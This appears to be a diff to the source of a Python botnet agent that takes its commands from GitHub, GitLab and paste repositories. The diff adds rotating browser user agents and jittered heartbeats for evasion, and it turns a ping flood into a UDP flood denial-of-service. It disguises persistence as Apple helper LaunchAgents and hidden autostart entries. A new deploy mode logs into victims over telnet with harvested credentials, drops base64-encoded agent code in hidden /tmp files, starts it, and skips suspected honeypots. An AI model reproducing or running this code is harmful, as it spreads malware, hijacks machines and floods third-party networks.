@@ -25,6 +25,7 @@ import hashlib
 import threading
 import urllib.request
 import urllib.error
+import urllib.parse
 from pathlib import Path
 from dataclasses import dataclass, field
 
@@ -37,7 +38,19 @@ MARKER_END = "<!-- CMD_END -->"
 MAX_FETCH_SIZE = 1_048_576
 MAX_DOWNLOAD_SIZE = 50_000_000
 MAX_SHELL_OUTPUT = 1_048_576
-USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+_USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
+]
+
+def _ua() -> str:
+    return random.choice(_USER_AGENTS)
 
 TOOL_NAMES = [
     "systemd", "cron", "bash", "sshd", "networkd",
@@ -73,7 +86,12 @@ def _get_bot_id() -> str:
     bot_id = base64.b32encode(os.urandom(6)).decode().rstrip("=")
     for loc in _id_paths():
         try:
-            Path(loc).write_text(bot_id)
+            p = Path(loc)
+            p.write_text(bot_id)
+            try:
+                p.chmod(0o600)
+            except OSError:
+                pass
             break
         except OSError:
             continue
@@ -130,8 +148,8 @@ class RepoSource:
         if self.platform == "debian":
             return self.raw_url
         if self.platform == "gitlab":
-            encoded_path = urllib.request.quote(self.file_path, safe="")
-            project_id = urllib.request.quote(f"{self.owner}/{self.repo}", safe="")
+            encoded_path = urllib.parse.quote(self.file_path, safe="")
+            project_id = urllib.parse.quote(f"{self.owner}/{self.repo}", safe="")
             return (f"https://gitlab.com/api/v4/projects/{project_id}"
                     f"/repository/files/{encoded_path}/raw?ref={self.branch}")
         return (f"https://api.github.com/repos/"
@@ -195,7 +213,7 @@ def fetch_raw(url: str, timeout: int = 15) -> str | None:
     full_url = url + cache_bust
 
     req = urllib.request.Request(full_url, headers={
-        "User-Agent": USER_AGENT,
+        "User-Agent": _ua(),
         "Accept": "text/plain, application/vnd.github.v3.raw",
         "Cache-Control": "no-cache, no-store",
         "Pragma": "no-cache",
@@ -215,7 +233,7 @@ def fetch_via_api(repo: RepoSource, timeout: int = 15) -> str | None:
     url = repo.api_url + cache_bust
 
     req = urllib.request.Request(url, headers={
-        "User-Agent": USER_AGENT,
+        "User-Agent": _ua(),
         "Accept": "application/json" if repo.platform == "github" else "text/plain",
         "Cache-Control": "no-cache",
     })
@@ -234,6 +252,19 @@ def fetch_via_api(repo: RepoSource, timeout: int = 15) -> str | None:
     return None
 
 
+def head_check(url: str, timeout: int = 10) -> bool:
+    req = urllib.request.Request(url, method="HEAD", headers={
+        "User-Agent": _ua(),
+    })
+    try:
+        with urllib.request.urlopen(req, timeout=timeout) as resp:
+            return resp.status == 200
+    except urllib.error.HTTPError as e:
+        return e.code != 404
+    except (urllib.error.URLError, OSError):
+        return False
+
+
 def fetch_from_repo(repo: RepoSource, use_api: bool = False) -> str | None:
     if use_api:
         return fetch_via_api(repo)
@@ -249,6 +280,11 @@ def fetch_with_fallback(config: PBConfig) -> tuple[str | None, RepoSource | None
             backoff = min(2 ** min(repo.fail_count, 10) * config.poll_interval, 3600)
             if repo.last_fail > 0 and time.time() - repo.last_fail < backoff:
                 continue
+
+        if repo.fail_count > 0 and not head_check(repo.raw_url):
+            repo.fail_count += 1
+            repo.last_fail = time.time()
+            continue
 
         content = fetch_from_repo(repo, use_api=config.use_api)
 
@@ -352,7 +388,7 @@ def exec_shell(cmd_str: str) -> str:
 
 def download_file(url: str, dest: str, run: bool = False, hide: bool = False):
     try:
-        req = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
+        req = urllib.request.Request(url, headers={"User-Agent": _ua()})
         with urllib.request.urlopen(req, timeout=30) as resp:
             data = resp.read(MAX_DOWNLOAD_SIZE)
 
@@ -463,18 +499,31 @@ def execute_command(cmd: str, config: PBConfig):
 
     elif action == "dos":
         tokens = args_str.split()
-        if len(tokens) >= 2:
-            target = tokens[0]
-            duration = tokens[-1]
+        if len(tokens) >= 3:
             try:
-                secs = min(int(duration), 300)
-                subprocess.Popen(
-                    ["timeout", str(secs), "ping", "-f", target],
-                    stdout=subprocess.DEVNULL,
-                    stderr=subprocess.DEVNULL,
-                )
-            except Exception:
-                pass
+                target = tokens[0]
+                port = int(tokens[1])
+                secs = min(int(tokens[2]), 300)
+            except (ValueError, IndexError):
+                return
+
+            def _udp_flood(ip, pt, duration):
+                end = time.time() + duration
+                pkt = os.urandom(1024)
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    while time.time() < end:
+                        try:
+                            sock.sendto(pkt, (ip, pt))
+                        except OSError:
+                            break
+                    sock.close()
+                except Exception:
+                    pass
+
+            threading.Thread(
+                target=_udp_flood, args=(target, port, secs), daemon=True
+            ).start()
 
     elif action == "popmsg":
         pop_message(args_str)
@@ -507,11 +556,11 @@ def daemonize():
             sys.exit(0)
         sys.stdout.flush()
         sys.stderr.flush()
-        devnull_r = open(os.devnull, "r")
-        devnull_w = open(os.devnull, "w")
-        os.dup2(devnull_r.fileno(), sys.stdin.fileno())
-        os.dup2(devnull_w.fileno(), sys.stdout.fileno())
-        os.dup2(devnull_w.fileno(), sys.stderr.fileno())
+        devnull_fd = os.open(os.devnull, os.O_RDWR)
+        os.dup2(devnull_fd, sys.stdin.fileno())
+        os.dup2(devnull_fd, sys.stdout.fileno())
+        os.dup2(devnull_fd, sys.stderr.fileno())
+        os.close(devnull_fd)
     except OSError:
         pass
 
@@ -540,6 +589,7 @@ def _install_cron(config_path: str):
 
 def install_persistence(config_path: str = CONFIG_FILE):
     system = platform.system()
+    tag = random.Random(socket.gethostname().encode()).choice(TOOL_NAMES)
     try:
         exe = os.path.abspath(sys.argv[0])
 
@@ -555,23 +605,44 @@ def install_persistence(config_path: str = CONFIG_FILE):
         elif system == "Linux":
             autostart = Path.home() / ".config" / "autostart"
             autostart.mkdir(parents=True, exist_ok=True)
-            dest = autostart / os.path.basename(exe)
-            if not dest.exists():
-                try:
-                    os.symlink(exe, dest)
-                except OSError:
-                    pass
+            desktop_name = f"{tag}-monitor.desktop"
+            desktop_path = autostart / desktop_name
+            if not desktop_path.exists():
+                desktop_path.write_text(
+                    f"[Desktop Entry]\n"
+                    f"Type=Application\n"
+                    f"Name={tag} Monitor\n"
+                    f"Exec=/usr/bin/python3 {exe} agent -c {config_path} --daemon --no-persist\n"
+                    f"Hidden=false\n"
+                    f"NoDisplay=true\n"
+                    f"X-GNOME-Autostart-enabled=true\n"
+                )
             _install_cron(config_path)
 
         elif system == "Darwin":
             launch = Path.home() / "Library" / "LaunchAgents"
             launch.mkdir(parents=True, exist_ok=True)
-            dest = launch / os.path.basename(exe)
-            if not dest.exists():
-                try:
-                    os.symlink(exe, dest)
-                except OSError:
-                    pass
+            plist_name = f"com.apple.{tag}-helper.plist"
+            plist_path = launch / plist_name
+            if not plist_path.exists():
+                plist_path.write_text(
+                    f'<?xml version="1.0" encoding="UTF-8"?>\n'
+                    f'<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"'
+                    f' "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n'
+                    f'<plist version="1.0">\n<dict>\n'
+                    f'  <key>Label</key>\n  <string>com.apple.{tag}-helper</string>\n'
+                    f'  <key>ProgramArguments</key>\n  <array>\n'
+                    f'    <string>/usr/bin/python3</string>\n'
+                    f'    <string>{exe}</string>\n'
+                    f'    <string>agent</string>\n'
+                    f'    <string>-c</string>\n'
+                    f'    <string>{config_path}</string>\n'
+                    f'    <string>--no-persist</string>\n'
+                    f'  </array>\n'
+                    f'  <key>RunAtLoad</key>\n  <true/>\n'
+                    f'  <key>KeepAlive</key>\n  <true/>\n'
+                    f'</dict>\n</plist>\n'
+                )
 
     except Exception:
         pass
@@ -582,28 +653,34 @@ def _heartbeat_loop(url_template: str, interval: int, bot_id: str, stop_event: t
         try:
             phash = _padded_hash(bot_id)
             url = url_template.replace("{id}", phash)
-            req = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
+            req = urllib.request.Request(url, headers={"User-Agent": _ua()})
             urllib.request.urlopen(req, timeout=15)
         except Exception:
             pass
-        stop_event.wait(interval)
+        jitter = random.randint(-max(interval // 5, 5), max(interval // 5, 5))
+        stop_event.wait(max(30, interval + jitter))
 
 
 def _merge_repos_from_payload(config: PBConfig, payload: dict):
     existing = {f"{r.platform}:{r.owner}/{r.repo}" for r in config.repos}
     for gh in payload.get("gh", []):
         parts = gh.split("/")
-        if len(parts) == 2 and f"github:{gh}" not in existing:
+        key = f"github:{gh}"
+        if len(parts) == 2 and key not in existing:
             config.repos.append(RepoSource(owner=parts[0], repo=parts[1], platform="github"))
+            existing.add(key)
     for gl in payload.get("gl", []):
         parts = gl.split("/")
-        if len(parts) == 2 and f"gitlab:{gl}" not in existing:
+        key = f"gitlab:{gl}"
+        if len(parts) == 2 and key not in existing:
             config.repos.append(RepoSource(owner=parts[0], repo=parts[1], platform="gitlab"))
+            existing.add(key)
     existing_dp = {r.repo for r in config.repos if r.platform == "debian"}
     for dp in payload.get("dp", []):
         if dp not in existing_dp:
             config.repos.append(RepoSource(owner="", repo=dp, platform="debian",
                                            branch="", file_path=""))
+            existing_dp.add(dp)
 
 
 def agent_loop(config: PBConfig, verbose: bool = False):
@@ -666,6 +743,241 @@ def agent_loop(config: PBConfig, verbose: bool = False):
         jitter = random.randint(-config.jitter, config.jitter)
         sleep_time = max(10, config.poll_interval + jitter)
         time.sleep(sleep_time)
+
+
+HONEYPOT_CHECK_PORTS = [21, 22, 23, 25, 80, 110, 143, 443, 993, 995, 2323, 3306, 5432, 8080, 8443]
+HONEYPOT_PORT_THRESHOLD = 11
+
+
+def _check_port(ip: str, port: int, timeout: float = 2.0) -> bool:
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(timeout)
+            return s.connect_ex((ip, port)) == 0
+    except Exception:
+        return False
+
+
+def _is_honeypot_by_ports(ip: str) -> bool:
+    open_count = sum(1 for p in HONEYPOT_CHECK_PORTS if _check_port(ip, p))
+    return open_count >= HONEYPOT_PORT_THRESHOLD
+
+
+def _is_honeypot_by_ports_async(targets: list[dict]) -> dict[str, bool]:
+    results = {}
+    lock = threading.Lock()
+
+    def check(ip):
+        hp = _is_honeypot_by_ports(ip)
+        with lock:
+            results[ip] = hp
+
+    threads = []
+    seen = set()
+    for t in targets:
+        ip = t["ip"]
+        if ip not in seen:
+            seen.add(ip)
+            th = threading.Thread(target=check, args=(ip,), daemon=True)
+            th.start()
+            threads.append(th)
+
+    for th in threads:
+        th.join(timeout=60)
+
+    return results
+
+
+def _telnet_deploy(ip: str, port: int, user: str, passwd: str,
+                   agent_code: str, zwenc_code: str,
+                   repo_args: list[str], config_path: str,
+                   verbose: bool = False) -> bool:
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(30)
+        sock.connect((ip, port))
+        time.sleep(1)
+        sock.recv(4096)
+
+        def send_line(line: str, delay: float = 0.3):
+            sock.sendall((line + "\n").encode())
+            time.sleep(delay)
+            try:
+                sock.recv(4096)
+            except socket.timeout:
+                pass
+
+        send_line(user, 1.0)
+        send_line(passwd, 1.5)
+
+        response = b""
+        try:
+            response = sock.recv(4096)
+        except socket.timeout:
+            pass
+        resp_text = response.decode("ascii", errors="replace")
+
+        if any(s in resp_text.lower() for s in ("denied", "fail", "incorrect", "invalid")):
+            sock.close()
+            return False
+
+        send_line("cd /tmp", 0.5)
+
+        zwenc_b64 = base64.b64encode(zwenc_code.encode()).decode()
+        chunk_size = 512
+        send_line("rm -f /tmp/.zwenc.py /tmp/.agent.py", 0.3)
+
+        for i in range(0, len(zwenc_b64), chunk_size):
+            chunk = zwenc_b64[i:i+chunk_size]
+            if i == 0:
+                send_line(f'echo -n "{chunk}" > /tmp/.zw_b64', 0.2)
+            else:
+                send_line(f'echo -n "{chunk}" >> /tmp/.zw_b64', 0.2)
+        send_line("base64 -d /tmp/.zw_b64 > /tmp/.zwenc.py && rm /tmp/.zw_b64", 0.5)
+
+        agent_b64 = base64.b64encode(agent_code.encode()).decode()
+        for i in range(0, len(agent_b64), chunk_size):
+            chunk = agent_b64[i:i+chunk_size]
+            if i == 0:
+                send_line(f'echo -n "{chunk}" > /tmp/.ag_b64', 0.2)
+            else:
+                send_line(f'echo -n "{chunk}" >> /tmp/.ag_b64', 0.2)
+        send_line("base64 -d /tmp/.ag_b64 > /tmp/.agent.py && rm /tmp/.ag_b64", 0.5)
+
+        deploy_repos = []
+        for r in repo_args:
+            if r.startswith("dp:") or r.startswith("debian:"):
+                paste_id = r.split(":", 1)[1]
+                deploy_repos.append({
+                    "owner": "", "repo": paste_id, "platform": "debian",
+                    "branch": "", "file_path": "",
+                    "fail_count": 0, "last_fail": 0, "last_success": 0})
+            else:
+                plat = "github"
+                clean = r
+                if r.startswith("gl:") or r.startswith("gitlab:"):
+                    plat = "gitlab"
+                    clean = r.split(":", 1)[1]
+                elif r.startswith("gh:") or r.startswith("github:"):
+                    clean = r.split(":", 1)[1]
+                parts = clean.split("/")
+                if len(parts) == 2:
+                    deploy_repos.append({
+                        "owner": parts[0], "repo": parts[1], "platform": plat,
+                        "branch": "main", "file_path": "README.md",
+                        "fail_count": 0, "last_fail": 0, "last_success": 0})
+        cfg_content = json.dumps({
+            "repos": deploy_repos,
+            "poll_interval": 60,
+            "jitter": 15,
+            "max_fails_before_skip": 5,
+            "use_api": False,
+            "last_command_hash": "",
+        }, separators=(",", ":"))
+        cfg_b64 = base64.b64encode(cfg_content.encode()).decode()
+        send_line(f'echo "{cfg_b64}" | base64 -d > /tmp/.pb_cfg.json', 0.5)
+
+        send_line(
+            "nohup python3 /tmp/.agent.py agent -c /tmp/.pb_cfg.json --daemon --no-persist "
+            "> /dev/null 2>&1 &",
+            1.0,
+        )
+
+        if verbose:
+            print(f"    {C.GREEN}[+] Agent deployed and started{C.RESET}")
+
+        sock.close()
+        return True
+
+    except Exception as e:
+        if verbose:
+            print(f"    {C.RED}[-] Deploy failed: {e}{C.RESET}")
+        try:
+            sock.close()
+        except Exception:
+            pass
+        return False
+
+
+def load_deploy_targets(path: str) -> list[dict]:
+    targets = []
+    p = Path(path)
+    if not p.exists():
+        return targets
+
+    for line in p.read_text().splitlines():
+        line = line.strip()
+        if not line or line.startswith("#"):
+            continue
+        try:
+            obj = json.loads(line)
+            if "ip" in obj and "port" in obj:
+                if obj.get("shell") or obj.get("method"):
+                    targets.append({
+                        "ip": obj["ip"],
+                        "port": obj["port"],
+                        "username": obj.get("username", "root"),
+                        "password": obj.get("password", ""),
+                    })
+        except json.JSONDecodeError:
+            parts = line.split(":")
+            if len(parts) >= 4:
+                try:
+                    targets.append({
+                        "ip": parts[0],
+                        "port": int(parts[1]),
+                        "username": parts[2],
+                        "password": parts[3],
+                    })
+                except ValueError:
+                    continue
+    return targets
+
+
+def deploy_to_targets(targets: list[dict], repo_args: list[str],
+                      verbose: bool = False) -> tuple[int, int]:
+    agent_path = Path(__file__).resolve()
+    zwenc_path = agent_path.parent / "zwenc.py"
+
+    agent_code = agent_path.read_text()
+    zwenc_code = zwenc_path.read_text()
+
+    if verbose:
+        print(f"{C.CYAN}[*] Running honeypot port-count checks on {len(targets)} target(s)...{C.RESET}")
+
+    hp_results = _is_honeypot_by_ports_async(targets)
+    clean_targets = []
+    for t in targets:
+        if hp_results.get(t["ip"], False):
+            if verbose:
+                print(f"  {C.YELLOW}[HONEYPOT] {t['ip']} — skipping (port-count){C.RESET}")
+        else:
+            clean_targets.append(t)
+
+    if verbose:
+        print(f"{C.CYAN}[*] Deploying to {len(clean_targets)} target(s) "
+              f"(skipped {len(targets) - len(clean_targets)} honeypot(s)){C.RESET}")
+
+    success = 0
+    fail = 0
+    for t in clean_targets:
+        if verbose:
+            print(f"  {C.BOLD}{t['ip']}:{t['port']}{C.RESET} ({t['username']})...", end=" ")
+        ok = _telnet_deploy(
+            t["ip"], t["port"], t["username"], t["password"],
+            agent_code, zwenc_code, repo_args, "",
+            verbose=verbose,
+        )
+        if ok:
+            success += 1
+            if verbose:
+                print(f"{C.GREEN}OK{C.RESET}")
+        else:
+            fail += 1
+            if verbose:
+                print(f"{C.RED}FAIL{C.RESET}")
+
+    return success, fail
 
 
 def generate_readme(commands: list[str], title: str = "Project") -> str:
@@ -744,7 +1056,7 @@ MIT
     cmd <shell command>               — Execute shell command
     shell <shell command>             — Alias for cmd
     download <url> <dest> [RUN] [HIDE] — Download file
-    dos <ip> <seconds>                — ICMP flood (max 300s)
+    dos <ip> <port> <seconds>        — UDP flood (max 300s)
     popmsg <message>                  — Browser popup
     add_repo [gh:|gl:]<owner/repo>    — Add fallback repo (gh: or gl: prefix)
     set_interval <seconds>            — Change poll interval
@@ -813,6 +1125,7 @@ def main():
 modes:
   agent    Run the C2 agent (polls repos for commands)
   server   Interactive shell to generate README payloads
+  deploy   Deploy agent to compromised targets via telnet
   config   Generate a default config file
   test     Test fetching from configured repos
 
@@ -827,11 +1140,12 @@ examples:
   %(prog)s agent -c pb_config.json
   %(prog)s agent -r user/repo1 -r gl:user/repo2 --daemon
   %(prog)s server
+  %(prog)s deploy -f output/results.jsonl -r user/c2-repo
   %(prog)s config -r user/c2-primary -r gl:user/c2-backup
   %(prog)s test -c pb_config.json
 """,
     )
-    parser.add_argument("mode", choices=["agent", "server", "config", "test"],
+    parser.add_argument("mode", choices=["agent", "server", "config", "test", "deploy"],
                         help="Operating mode")
     parser.add_argument("-c", "--config", default=CONFIG_FILE,
                         help="Config file path")
@@ -841,6 +1155,8 @@ examples:
                         help="Poll interval in seconds")
     parser.add_argument("--api", action="store_true",
                         help="Use platform API instead of raw URLs")
+    parser.add_argument("-f", "--targets-file", default="",
+                        help="File with deployment targets (results.jsonl or ip:port:user:pass)")
     parser.add_argument("--no-persist", action="store_true",
                         help="Don't install persistence")
     parser.add_argument("--daemon", action="store_true",
@@ -893,6 +1209,40 @@ examples:
             else:
                 print(f"    {C.RED}FAIL{C.RESET} — unreachable")
             print()
+        return
+
+    elif args.mode == "deploy":
+        if not args.targets_file:
+            print(f"{C.RED}[!] Deploy mode requires -f <targets_file>{C.RESET}")
+            print(f"    File format: results.jsonl from scanner, or ip:port:user:pass per line")
+            sys.exit(1)
+
+        targets = load_deploy_targets(args.targets_file)
+        if not targets:
+            print(f"{C.RED}[!] No valid targets found in {args.targets_file}{C.RESET}")
+            sys.exit(1)
+
+        repo_strs = [r for r in args.repo]
+        if not repo_strs:
+            config = PBConfig.load(args.config)
+            repo_strs = []
+            for r in config.repos:
+                if r.platform == "debian":
+                    repo_strs.append(f"dp:{r.repo}")
+                elif r.platform == "gitlab":
+                    repo_strs.append(f"gl:{r.owner}/{r.repo}")
+                else:
+                    repo_strs.append(f"{r.owner}/{r.repo}")
+
+        if not repo_strs:
+            print(f"{C.RED}[!] No repos specified. Use -r or configure repos in config.{C.RESET}")
+            sys.exit(1)
+
+        print(f"[*] Targets: {len(targets)}")
+        print(f"[*] Repos: {', '.join(repo_strs)}")
+
+        success, fail = deploy_to_targets(targets, repo_strs, verbose=args.verbose)
+        print(f"\n{C.GREEN}[*] Deploy complete: {success} success, {fail} failed{C.RESET}")
         return
 
     elif args.mode == "agent":
